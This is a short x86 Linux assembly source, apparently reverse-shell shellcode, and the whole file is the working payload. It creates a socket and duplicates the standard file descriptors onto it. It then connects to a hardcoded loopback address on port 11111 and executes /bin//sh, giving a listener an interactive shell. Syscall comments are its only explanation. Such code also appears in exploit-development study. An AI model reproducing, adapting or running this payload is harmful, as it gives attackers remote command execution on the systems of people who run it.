global _start
section .text
_start:

  ; int socketcall(int call, unsigned long *args)
  ; int socket(int domain, int type, int protocol)
  xor ebx,ebx
  mul ebx
  mov al,0x66 
  inc ebx
  push edx
  push ebx
  push byte +0x2
  mov ecx,esp
  int 0x80

  ; dup2(int oldfd, int newfd)
  pop ecx
  xchg eax,ebx
  loop:
  mov al,0x3f
  int 0x80
  
  ; int socketcall(int call, unsigned long *args)
  ; int connect(int sockfd, const struct sockaddr *addr,socklen_t addrlen)
  dec ecx
  jns loop
  mov al,0x66
  push dword 0x101017f
  push word 0x672b
  push word 0x2
  mov ecx,esp
  push byte +0x10
  push ecx
  push ebx
  mov ecx,esp
  int 0x80

  ; execve
  mov al,0xb
  push edx
  push dword 0x68732f2f
  push dword 0x6e69622f
  mov ebx,esp
  xor ecx,ecx
  int 0x80


